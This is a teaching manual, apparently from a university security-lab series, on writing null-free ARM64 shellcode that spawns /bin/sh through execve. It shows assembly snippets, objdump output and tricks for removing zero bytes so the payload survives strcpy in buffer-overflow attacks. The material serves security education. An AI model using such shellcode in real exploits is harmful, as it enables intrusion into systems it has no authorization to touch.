Writing ARM64 Shellcode (in Ubuntu)
===================================
Copyright &copy; Wenliang Du.

In this manual, we describe how to write shellcode 
on the arm64 machine. The code in this manual
is written for Ubuntu operating system 
running on an Apple M1/M2 machine. 

*  [The main idea and challenges](#idea)
*  [Get the addresses of the "/bin/sh" string and argv[]](#getaddress)
*  [Problem: we have a zero in the shellcode](#problem)
*  [Rethink about the essence of the "detour" approach](#rethink)
*  [Finish the rest](#finish)
   *  [Put a zero byte at the end of the "/bin/sh" string](#endofstring)
   *  [Construct the argv[] array](#argv)
   *  [Invoke the execve() system call](#execve)
*  [The complete code](#completecode)


<h2 id="idea">The main idea and challenges</h2> 

To be able to have a direct control over what instructions 
to use in a shellcode, the best way to write a shellcode
is to use an assembly language. 
The main purpose of shellcode is to actually quite simple:
to run a shell program such as `/bin/sh`. 
This can be achieved by invoking the `execve()` system call. 
We need to pass three arguments to this system call: 
`execve("/bin/sh", argv[], 0)`. 
In the arm64 architecture, these 3 arguments are 
passed through the `x0`, `x1`, and `x2` registers. 
Here is the skeleton of the code:

```
 Let x0 = address of the "/bin/sh" string
 Let x1 = address of the argv[] array
 Let x2 = 0

 mov  x8, #221   // 221 is execve's system call number
 svc  #0x1337    // Invoke execve()
```

There are two main challenges in writing a shellcode.

- Challenge 1: How to get the addresses of the "/bin/sh" string and argv[]?

- Challenge 2: How to ensure there is no zero in the shellcode? In the buffer-overflow 
  attack, the shellcode will be copied into the victim program's buffer. In some 
  cases, the copy is done via `strcpy()` or other similar functions. These functions
  terminates at zero. Therefore, if there is a zero in the middle of a shellcode,
  only part of the shellcode can be copied into the target buffer. To ensure 
  that a shellcode is generic and useful to all the scenarios, it is mandatory
  that an ideal shellcode should not contain any zero. 


<h2 id="getaddress">Get the addresses of the "/bin/sh" string and argv[]</h2>

The main challenge of the shellcode is to get the address of 
the `"/bin/sh"` string and the `argv[]` array. There are two
typical approaches. 

- Approach 1: Store the data in the code segment, and then 
  get their address using the PC pointer, which points to the 
  code segment. This document focuses on this approach. 

- Approach 2: Dynamically construct the string and the `argv[]`
  array on the stack, and then use the stack pointer register to
  get their addresses. Although we will not discuss this approach
  in this document, a sample code [mysh_stack.s](./mysh_stack.s) 
  is provided with detailed comments. 

Both approaches are similar in terms of difficulties if 
we only want to execute the "/bin/sh" program, which does not 
take any argument. However, the first approach is much easier to 
implement if the program takes multiple arguments. 


The skeleton of the code (called `mysh.s`) using the first approach
is listed below. 

```
_start:
    b two
one:
    mov x19, x30  // x30 is the Link Register (LR)
    ...

two:
    bl one
    .ascii "/bin/sh*"
    .space 8, 0xAA   // Placeholder for argv[0]
    .space 8, 0xBB   // Placeholder for argv[1]
```

In the code above, we first jump to the code at label `two`, 
but as soon as we get there, we use `"bl one"` to jump back
to the code at label `one`. This "detour" is the key idea
for getting the address of the "/bin/sh" string and the `argv[]`
array. 

From the code, we can see that these data are stored
right below the `"bl one"` instruction. 
Before this instruction is executed, the PC register points
to the instruction's address (let's call it `addr`). 
The `bl` instruction is like a regular unconditional branch (the `b` instruction),
except that the address of the instruction underneath the `bl` instruction 
is placed into the Link Register (the `x30` register). 
Therefore, the `x30` register will contain `addr + 4` (the length of each 
instruciton in ARM64 is 4 bytes). That is the address where the data
are stored. Mission accomplished: we have obtained the address 
of the data! 


<h2 id="problem">Problem: we have a zero in the shellcode</h2>

Things are not that easy. Let's first we compile the code and then use 
the `objdump` to display the machine code. The commands
are listed below. 

```
$ as -o mysh.o mysh.s
$ ld --omagic -o mysh mysh.o
$ objdump -d mysh
```

The outcome of the `objdump` command is listed below: 

```
0000000000400078 <_start>:
  400078:  14000010   b     4000b8 <two>

000000000040007c <one>:
  40007c:  aa1e03f3   mov   x19, x30
                ...

00000000004000b8 <two>:
  4000b8:  97fffff1   bl    40007c <one>
                ...
```

The machine code for the first instruction `"b two"` is `14000010`. There
are two zeros in the code. Here is how to machine code is constructed: 
The relative address of the `two` section is `0x4000b8 - 0x400078 = 0x40`.
This instruction is the same as `"b #0x40`, because the compiler will 
convert the label `two` into its relative address `0x40`. This number
is divided by 4, and the result becomes part of the machine code. 
That is why we see `0x000010` in the machine code. 

The reason why we have zeros in the machine code is that `0x40` is too small.
If we do `"b 0x040404"`, the machine code becomes `14010101`: the zeros are gone.  
Therefore, if we put the `two` section `0x040404` bytes from the `one` section,
we can make it work. Unfortunately, this will increase the size of the 
shellcode; it may become to large for the target buffer in attacks. Unless somebody
can think about a better solution, we will abandon this "detour" approach. 


<h2 id="rethink">Rethink about the essence of the "detour" approach</h2> 

The "detour" approach initially came from the x86 shellcode. The essence of this 
approach is to get the PC register's value, because our data are stored in the 
code segment and the PC register value can help us get the data address. 
Unfortunately, there is no easy instruction
in x86 or amd64 (to my knowledge; correct me if I am wrong) to directly get 
the PC value. Using the `call` instruction in x86/amd64 will cause the PC value 
to be pushed into the stack, so we can read this value from the stack. 

In our failed attempt, we were trying to use the same technique to get the data
address. We had the same assumption that "the `bl` instruction is the only
way to get the PC register". The good news is that this assumption is not true
for the arm64 architecture. The `adr` instruction can also get the PC value.
For example, `"adr x19, 0x40"` will save the value of `PC + 0x40` to the 
`x19` register. 

Unfortunately, we face the same zero issue, because the instruction
above produces the machine code `10000213`, which still has a zero
in the code. The reason is the same: the value `0x40` is too small.
The only way to get rid of this zero is to increase the value.
If we run `"adr x19, 0x2020"`, our machine code becomes `10010113`: there
is no more zero. 

Unlike the `bl` instruction, where the offset is the 
location of the code that `bl` will jump to, in the `adr` instruction,
the offset value is just a value, so if we increase its value,
there is no impact on the code size. This allows us to 
use this trick: add a large number first, and then deduct it. 
The following code stores `PC + 0x2060` to `x11`, and then
deduct `0x2020` from `x11`, and save the result to `x19`. 
At the end, `x19` contains `PC + 0x40`, which is exactly 
what we want. 

```
adr  x11, 0x2060
mov  x12, 0x2020
sub  x19, x11, x12
```

If we show the machine code, we can see that there is no more zeros.

```
0000000000400078 <_start>:
  400078: 1001030b   adr     x11, 4020d8  <__bss_end__+0x1fe8>
  40007c: d284040c   mov     x12, #0x2020  
  400080: cb0c0173   sub     x19, x11, x12
```


<h2 id="finish">Finish the rest</h2>

At this point, we have solved the most difficult problem in writing 
a shellcode, but we are not done. The good news is that the rest is 
relatively easier. 


<h3 id="endofstring">Put a zero byte at the end of the "/bin/sh" string</h3> 

All strings have to be terminated by a zero. However, we cannot 
directly putting "/bin/sh\0" in our shellcode, because that 
will introduce a zero in the code. We will add this zero 
during the execution of the shellcode. In our example, we 
have a `*` at the end of the string. That is a placeholder, 
and we will replace it with a zero. 

In our previous code, we have already stored the address of the string 
in `x19`, so the `*`'s address is will be `x19 + 7`. 
We just need to store a zero byte at this address. The code 
below achieves this (the `wzr` is a zero register, which
contains the value zero):

```
mov  x8, 7           // x8 = 7: the offset of the * in "/bin/sh*"
strb wzr, [x19, x8]  // Store a zero byte at x19 + x8 (i.e. x19 + 7)
```

**Get rid of zero**. The instruction `"mov x8, 7"` actually has a 
zero in the machine code. 
The reason is that the value of `7` is too small. We will
use the same trick: add a larger number and then deduct the extra value. 
The following two instructions achieve the same goal: setting 
`x8` to 7. There is no zero in their machine code. 

```
mov  x9, 2008      // x9 = 2008
sub  x8, x9, 2001  // x8 = x9 - 2001 = 7
```


<h3 id="argv">Construct the argv[] array</h3> 

We also need to construct the `argv[]` array for the `execve()` 
system call. In our case, the array contains only two elements: 

- `argv[0]` should contain the address of the command string.
- `argv[1]` should contain zero, marking the end of the array.

When we write the program, these values are either unknown (the address
of the string) or zero, so we cannot put them in the code. 
That is why we created the two placeholders for them; 
during the execution of the shellcode, we dynamically fill 
these placeholders with the correct information. 
The addresses of `arg[0]` and `arg[1]` are at `x19 + 8` and 
`x19 + 16`, respectively. See the following code:

```
mov x8,  8           
mov x9,  x19         // x9  = address of the "/bin/bash" string
str x9, [x19, x8]    // Save x9 to argv[0] at x19 + 8

mov x8,  16
str xzr, [x19, x8]   // Save  0 to argv[1] at x19 + 16
```

<h3 id="execve">Invoke the execve() system call</h3> 

Now everything is set up and we are ready to invoke 
the `execve()` system call. This involves setting 
the `x0`, `x1`, and `x2` registers, one for each
argument. See the following code: 

```
mov  x0, x19         // x0 = addresss of command string ("/bin/sh")
adds x1, x19, 8      // x1 = address argv[], which is x19 + 8 
mov  x2, xzr         // x2 = 0; xzr is the zero register
mov  x8, #221        // 221 is execve's system call number
svc  #0x1337         // Invoke execve()
```

**Get rid of zero**: After a careful inspection of the machine code, we found that 
when we set the `x1` register above using `"adds `x1, x19, 8"`,
the machine code for this instruction has a zero. 

```
 4000a8:    b1002261    adds   x1, x19, #0x8
```

Again, the reason is that the value of `8` is too small. We will
use the same trick: add a larger number and then deduct the extra value. 
The following 3 instructions achieve the same goal: setting 
`x1` to `x19 + 8`. There is no zero in their machine code. 

```
adds x11, x19, 88    // x11 = x19 + 88
mov  x12, 80         // x12 = 80
sub  x1,  x11, x12   // x1  = x11 - x12 = x19 + 8
```


<h2 id="completecode">The complete code</h2> 

The complete code can be found in [mysh.s](./mysh.s). Its machine 
code can be found in [machine_code.txt](./machine_code.txt). 
There is no zero in the machine code. We can compile the code and run it.
You should be able to get a new shell. 

```
$ as -o mysh.o mysh.s
$ ld --omagic -o mysh mysh.o
$ ./mysh
$ <--- this is a new shell 
```

**Note about the `--omagic` option**: If we do not specify the `--omagic` option
in the `ld` command, our program will crash. This is because the shellcode 
needs to modify the data that are placed in the code segment. Typically, the 
code segment is read only, so writing to it will fail. 
The `--omagic` makes the code segment to be readable and writeable.
In the buffer overflow attack, this is not an issue, because the shellcode 
will be copied into the stack or heap, which is writable. 


